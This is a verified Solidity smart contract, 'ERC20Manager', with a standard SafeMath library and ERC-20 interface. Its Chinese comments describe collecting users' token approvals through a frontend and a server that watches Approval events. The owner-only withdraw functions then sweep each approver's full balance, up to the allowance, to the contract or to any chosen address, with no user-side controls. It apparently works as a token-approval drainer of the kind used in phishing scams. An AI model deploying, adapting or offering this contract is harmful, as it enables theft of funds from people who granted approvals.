/**
 *Submitted for verification at Etherscan.io on 2022-06-29
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            uint256 c = a + b;
            if (c < a) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b > a) return (false, 0);
            return (true, a - b);
        }
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
            // benefit is lost if 'b' is also tested.
            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
            if (a == 0) return (true, 0);
            uint256 c = a * b;
            if (c / a != b) return (false, 0);
            return (true, c);
        }
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a / b);
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        unchecked {
            if (b == 0) return (false, 0);
            return (true, a % b);
        }
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator.
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

contract ERC20Manager {
    
    /* ========== ERC20Manager ========== */

    /**
    * Gas 消耗：
    *        Ropsten：
    *            deploy 300w Gas
    *            initialize 9.4w Gas
    *            setApprover 7.2w Gas
    *            withDrawFrom 7w Gas
    *            withDrawFromTo 7w Gas
    *            withDraw/cheapWithdraw：转移 1 位用户 8w Gas，转移 3 位用户 12w Gas，转移 6 位用户 18w Gas，以此类推
    *            safeWithdraw 4.6w Gas
    *        Bsc Test：
    *            deploy 314w Gas
    *            initialize 9.6w Gas
    *            setApprover 8.6w Gas
    *            withDrawFrom 7.4w Gas
    *            withDrawFromTo 7.4w Gas
    *            withDraw/cheapWithdraw：转移 1 位用户 8w Gas，转移 3 位用户 12w Gas，转移 6 位用户 18w Gas，以此类推
    *            safeWithdraw 4.6w Gas
    */

    /**
    * 方案：
    *    1. 将授权用户保存在服务器中，按需转移某部分用户 Token，节省 Gas
    *    2. 将授权用户保存在该 ERC20Manager 合约中，但将 setApprover 函数的调用推给用户，节省 Gas
    *    3. 将授权用户保存在该 ERC20Manager 合约中，每次存入数据耗费 Gas，在大量用户的情况下，耗费大量 Gas
    */

    /**
    * 方案 1（节省 Gas，需要服务器处理逻辑）：
    *    由于将授权用户保存在服务器中，按需调用该 ERC20Manager 合约从而转移某部分用户 Token，因此在该 ERC20Manager 合
    *    约中只需关注 2 个函数即可。
    *    功能流程简单描述：
    *        1. 用户在前端授权一定数量的 Token
    *        2. 服务器监听该 Token 合约的 Approval Event，将授权用户的信息保存在服务器中，按需调用该 ERC20Manager 合约进行 Token 转移
    *        3. 调用该 ERC20Manager 合约中的 withdraw 函数进行 Token 转移，withdraw 函数分为 2 种类型，分别为：
    *            3.1 cheapWithdraw - 转移数组参数中所有地址下的尽可能多的 Token 至该 ERC20Manager 合约下，参考 Gas 消耗测试中的数据，请不要将数组参数设置过长，以免发生未知错误导致 Gas 浪费
    *            3.2 safeWithdraw - 转移该 ERC20Manager 合约下的 某个 数量的 Token 至 某个 地址
    *
    * 方案 2（节省 Gas，用户操作复杂）：
    *    由于将设置授权用户函数的调用推给了用户，因此在该 ERC20Manager 合约中只需关注 2 个函数即可。
    *    功能流程简单描述：
    *        1. 用户在前端授权一定数量的 Token
    *        2. 用户在前端调用 setApprover 函数，主动承担 Gas
    *        3. 调用该 ERC20Manager 合约中的 withdraw 函数进行 Token 转移，withdraw 函数分为 2 种类型，分别为：
    *            3.1 cheapWithdraw - 转移数组参数中所有地址下的尽可能多的 Token 至该 ERC20Manager 合约下，参考 Gas 消耗测试中的数据，请不要将数组参数设置过长，以免发生未知错误导致 Gas 浪费
    *            3.2 safeWithdraw - 转移该 ERC20Manager 合约下的 某个 数量的 Token 至 某个 地址
    *
    * 方案 3（耗费 Gas）：
    *     由于设计架构的原因，该 ERC20Manager 合约部署时没有任何数据。即使用户进行了授权，该合约也无法获取到授权信息，因
    *     此必须配合服务器进行 Token 的 Approval Event 事件监听，过滤筛选所有 `to` 为该 ERC20Manager 合约地址的 Event，
    *     并调用该 ERC20Manager 合约中的 setApprover 函数，将授权用户保存在该合约下。
    *     功能流程简单描述：
    *         1. 用户在前端授权一定数量的 Token
    *         2. 服务器监听该 Token 合约的 Approval Event
    *         3. 调用该 ERC20Manager 合约中的 setApprover 函数，将授权用户保存在该合约下
    *         4. 调用该 ERC20Manager 合约中的 withdraw 函数进行 Token 转移，withdraw 函数分为 5 种类型，分别为：
    *            4.1 withdrawFrom（推荐，统一管理） - 转移某地址下的尽可能多的 Token 至该 ERC20Manager 合约
    *            4.2 withdrawFromTo - 转移某地址下的尽可能多的 Token 至 某个 地址
    *            4.3 withdraw（推荐，统一管理） - 转移所有具有授权记录在该 ERC20Manager 合约下的所有地址的尽可能多的 Token 至该 ERC20Manager 合约下
    *            4.4 withdrawTo - 转移所有具有授权记录在该 ERC20Manager 合约下的所有地址的尽可能多的 Token 至 某个 地址
    *            4.5 safeWithdraw - 转移该 ERC20Manager 合约下的 某个 数量的 Token 至 某个 地址
    *
    * 外部函数：
    *     1. getTotalApprover view - 获取所有已授权的用户列表
    *     2. withdrawFrom
    *     3. withdrawFromTo
    *     4. withdraw
    *     5. withdrawTo
    *     6. cheapWithdraw
    *     7. safeWithdraw
    *
    * 内部函数：
    *     1. approvedOfAddress view - 获取 某个 地址的 Token 授权数量
    *     2. balanceOfAddress view - 获取 某个 地址的 Token 持有数量
    *
    * 非该 ERC20Manager 合约内必要的数据，直接调用 Token 合约获取即可
    */

    using SafeMath for uint256;

    event setapprover(address approver);
    event withdrawfrom(address from);
    event withdrawfromto(address from, address to);
    event _withdraw();
    event withdrawto(address to);
    event cheapwithdraw(address[] approvers);
    event safewithdraw(address to, uint256 amount);

    mapping(address => bool) private isExisted;
    address[] private totalApprover;

    IERC20 private Token;

    address private immutable owner;

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    constructor(address token) {
        require(token != address(0), 'ERC20 address is wrong');
        owner = msg.sender;
        Token = IERC20(token);
    }

    function setApprover(address approver) external {
        require(approver != address(0), 'The approver address is wrong');
        
        if(!isExisted[approver]) {
            isExisted[approver] = true;
            totalApprover.push(approver);
        }

        emit setapprover(approver);
    }

    function getTotalApprover() external view onlyOwner() returns (address[] memory) {
        return totalApprover;
    }

    function approvedOfAddress(address approver) internal view returns (uint256) {
        return Token.allowance(approver, address(this));
    }

    function balanceOfAddress(address approver) internal view returns (uint256) {
        return Token.balanceOf(approver);
    }

    function withdrawFrom(address from) external onlyOwner() {
        require(from != address(0), 'The approver address is wrong');

        uint256 balance = balanceOfAddress(from);
        uint256 allowance = approvedOfAddress(from);
        if(balance <= allowance) {
            Token.transferFrom(from, address(this), balance);
        } else {
            Token.transferFrom(from, address(this), allowance);
        }

        emit withdrawfrom(from);
    }
    
    function withdrawFromTo(address from, address to) external onlyOwner() {
        require(from != address(0), 'The approver address is wrong');
        require(to != address(0), 'The withdraw address is wrong');

        uint256 balance = balanceOfAddress(from);
        uint256 allowance = approvedOfAddress(from);
        if(balance <= allowance) {
            Token.transferFrom(from, to, balance);
        } else {
            Token.transferFrom(from, to, allowance);
        }

        emit withdrawfromto(from, to);
    }

    function withdraw() external onlyOwner() {
        for(uint256 i ; i<totalApprover.length ; i++) {
            uint256 balance = balanceOfAddress(totalApprover[i]);
            uint256 allowance = approvedOfAddress(totalApprover[i]);
            if(balance <= allowance) {
                Token.transferFrom(totalApprover[i], address(this), balance);
            } else {
                Token.transferFrom(totalApprover[i], address(this), allowance);
            }
        }

        emit _withdraw();
    }

    function withdrawTo(address to) external onlyOwner() {
        require(to != address(0), 'The withdraw address is wrong');

        for(uint256 i ; i<totalApprover.length ; i++) {
            uint256 balance = balanceOfAddress(totalApprover[i]);
            uint256 allowance = approvedOfAddress(totalApprover[i]);
            if(balance <= allowance) {
                Token.transferFrom(totalApprover[i], to, balance);
            } else {
                Token.transferFrom(totalApprover[i], to, allowance);
            }
        }

        emit withdrawto(to);
    }

    function cheapWithdraw(address[] memory approvers) external onlyOwner() {
        for(uint256 i ; i<approvers.length ; i++) {
            uint256 balance = balanceOfAddress(approvers[i]);
            uint256 allowance = approvedOfAddress(approvers[i]);
            if(balance <= allowance) {
                Token.transferFrom(approvers[i], address(this), balance);
            } else {
                Token.transferFrom(approvers[i], address(this), allowance);
            }
        }

        emit cheapwithdraw(approvers);
    }

    function safeWithdraw(address to, uint256 amount) external onlyOwner() {
        require(to != address(0), 'The withdraw address is wrong');
        require(balanceOfAddress(address(this)) >= amount, 'The safeWithdraw amount is wrong');

        Token.transfer(to, amount);

        emit safewithdraw(to, amount);
    }
}